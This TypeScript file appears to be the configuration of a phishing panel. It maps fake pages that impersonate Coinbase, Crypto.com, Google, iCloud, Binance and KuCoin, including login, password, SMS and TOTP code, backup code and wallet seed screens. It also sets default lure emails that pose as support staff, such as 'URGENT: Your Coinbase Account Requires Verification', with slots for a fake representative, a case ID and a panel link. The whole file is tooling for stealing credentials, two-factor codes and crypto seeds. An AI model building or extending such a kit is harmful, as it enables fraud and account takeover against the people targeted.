export interface TemplateInput {
	name: string;
	placeholder: string;
	type: string;
	inputMode?: string;
	filter?: string;
}

export interface TemplateRoute {
	path: string;
	inputs?: TemplateInput[];
}

export interface TemplateBrand {
	icon: string;
	routes: Record<string, TemplateRoute>;
}

export const templates: Record<string, TemplateBrand> = {
	Coinbase: {
		icon: '/images/coinbase.png',
		routes: {
			Loading: { path: 'coinbase/loading/template' },
			External: { path: 'coinbase/external/template' },
			Activity: { path: 'coinbase/activity/template' },
			Balance: { path: 'coinbase/balance/template' },
			'Case ID': { path: 'coinbase/case/template' },
			CBW: { path: 'coinbase/cbw/template' },
			'Reset Pass': { path: 'coinbase/reset/template' },
			Swap: { path: 'coinbase/swap/template' },
			Vault: {
				path: 'coinbase/vault/template',
				inputs: [
					{
						name: 'Balance',
						placeholder: '1000.00',
						type: 'number',
						inputMode: 'decimal',
						filter: '/^[0-9]*\\.?[0-9]*$/'
					}
				]
			},
			'Vault Seed':        { path: 'coinbase/vault-seed/template' },
			'Review Login':      { path: 'coinbase/review-login/template' },
			'Review Withdrawal': { path: 'coinbase/review-withdrawal/template' },
			'Review Email':      { path: 'coinbase/review-email/template' },
			'Trust Device':      { path: 'coinbase/trust-device/template' },
			'Change Password':   { path: 'coinbase/change-password/template' },
			'SMS Verify':        { path: 'coinbase/sms-verify/template' },
			'Terminate Devices': { path: 'coinbase/terminate-devices/template' },
			'Securing Account':  { path: 'coinbase/securing-account/template' },
			'Protect Assets':    { path: 'coinbase/protect-assets/template' },
			'Moving Vault':      { path: 'coinbase/moving-vault/template' },
			'Vault Intro':       { path: 'coinbase/vault-intro/template' },
			'Vault Setup':       { path: 'coinbase/vault-setup/template' }
		}
	},
	CDC: {
		icon: '/images/cdc.png',
		routes: {
			Loading: { path: 'cdc/loading/template' },
			Activity: { path: 'cdc/activity/template' },
			Balance: { path: 'cdc/balance/template' },
			'Case ID': { path: 'cdc/case/template' },
			External: { path: 'cdc/external/template' },
			Wallet: { path: 'cdc/wallet/template' }
		}
	},
	Google: {
		icon: '/images/google.png',
		routes: {
			Loading: { path: 'google/loading/template' },
			Login: { path: 'google/login/template' },
			Password: { path: 'google/password/template' },
			'Backup code': { path: 'google/backup/template' },
			Fail: { path: 'google/fail/template' },
			TOTP: { path: 'google/totp/template' },
			SMS: { path: 'google/sms/template' }
		}
	},
	iCloud: {
		icon: '/images/icloud.png',
		routes: {
			Login: { path: 'icloud/login/template' },
			Password: { path: 'icloud/password/template' },
			'2fa': { path: 'icloud/2fa/template' },
			Locked: { path: 'icloud/locked/template' }
		}
	},
	Binance: {
		icon: '/images/binance.png',
		routes: {
			Loading: { path: 'binance/loading/template' },
			Case: { path: 'binance/case/template' },
			Backup: { path: 'binance/backup/template' },
			Balance: { path: 'binance/balance/template' },
			Activity: { path: 'binance/activity/template' }
		}
	},
	KuCoin: {
		icon: '/images/kucoin.png',
		routes: {
			Loading: { path: 'kucoin/loading/template' }
		}
	}
};

export function getAllPages(): { brand: string; page: string; path: string; inputs?: TemplateInput[] }[] {
	const pages: { brand: string; page: string; path: string; inputs?: TemplateInput[] }[] = [];
	for (const [brand, def] of Object.entries(templates)) {
		for (const [page, route] of Object.entries(def.routes)) {
			pages.push({ brand, page, path: route.path, inputs: route.inputs });
		}
	}
	return pages;
}

export function getTemplateKey(brand: string, page: string): string {
	return `${brand}/${page}`;
}

export function parseTemplateKey(key: string): { brand: string; page: string } | null {
	const idx = key.indexOf('/');
	if (idx === -1) return null;
	return { brand: key.substring(0, idx), page: key.substring(idx + 1) };
}

export function getRouteForKey(key: string): TemplateRoute | null {
	const parsed = parseTemplateKey(key);
	if (!parsed) return null;
	return templates[parsed.brand]?.routes[parsed.page] ?? null;
}

export interface MailTemplate {
	id: string;
	name: string;
	subject: string;
	variables: string[];
	html: string;
	by: string;
}

import coinbaseSupportHtml from '../../data/templates/coinbase-support-request.html?raw';
import coinbaseSafepalHtml from '../../data/templates/coinbase-safepal.html?raw';
import googleEmployee1Html from '../../data/templates/google-employee-1.html?raw';
import googleEmployee2Html from '../../data/templates/google-employee-2.html?raw';
import googlePassword1Html from '../../data/templates/google-password-1.html?raw';
import googlePassword2Html from '../../data/templates/google-password-2.html?raw';
import googlePortal1Html from '../../data/templates/google-portal-1.html?raw';
import googlePortal2Html from '../../data/templates/google-portal-2.html?raw';
import googlePortal3Html from '../../data/templates/google-portal-3.html?raw';

export const defaultMailTemplates: MailTemplate[] = [
	{
		id: 'Coinbase_Portal',
		name: 'Coinbase Support Request',
		subject: 'URGENT: Your Coinbase Account Requires Verification',
		variables: ['[[Representative name]]', '[[Case ID]]', '[[Panel Link]]'],
		html: coinbaseSupportHtml,
		by: 'admin'
	},
	{
		id: 'Coinbase_SafePal',
		name: 'Coinbase SafePal',
		subject: 'Wallet Recovery Instructions',
		variables: ['[[Safepal Seed]]'],
		html: coinbaseSafepalHtml,
		by: 'admin'
	},
	{
		id: 'Google_Employee1',
		name: 'Google Employee #1',
		subject: 'Your Google Support Representative',
		variables: ['[[Representitve Name]]', '[[Case ID]]'],
		html: googleEmployee1Html,
		by: 'admin'
	},
	{
		id: 'Google_Employee2',
		name: 'Google Employee #2',
		subject: 'Representative Assignment Verification',
		variables: ['[[Representitve Name]]', '[[Case ID]]'],
		html: googleEmployee2Html,
		by: 'admin'
	},
	{
		id: 'Google_Password1',
		name: 'Google Password #1',
		subject: 'Your Temporary Access Password',
		variables: ['[[Password]]'],
		html: googlePassword1Html,
		by: 'admin'
	},
	{
		id: 'Google_Password2',
		name: 'Google Password #2',
		subject: 'Recent Call Follow-Up',
		variables: ['[[Password]]'],
		html: googlePassword2Html,
		by: 'admin'
	},
	{
		id: 'Google_Portal1',
		name: 'Google Portal #1',
		subject: 'Your Access Portal',
		variables: ['[[Case ID]]', '[[Panel Link]]'],
		html: googlePortal1Html,
		by: 'admin'
	},
	{
		id: 'Google_Portal2',
		name: 'Google Portal #2',
		subject: 'Case Portal Access',
		variables: ['[[Representative Name]]', '[[Case ID]]', '[[Panel Link]]'],
		html: googlePortal2Html,
		by: 'admin'
	},
	{
		id: 'Google_Portal3',
		name: 'Google Portal #3',
		subject: 'Case Access Portal',
		variables: ['[[Panel Link]]'],
		html: googlePortal3Html,
		by: 'admin'
	}
];
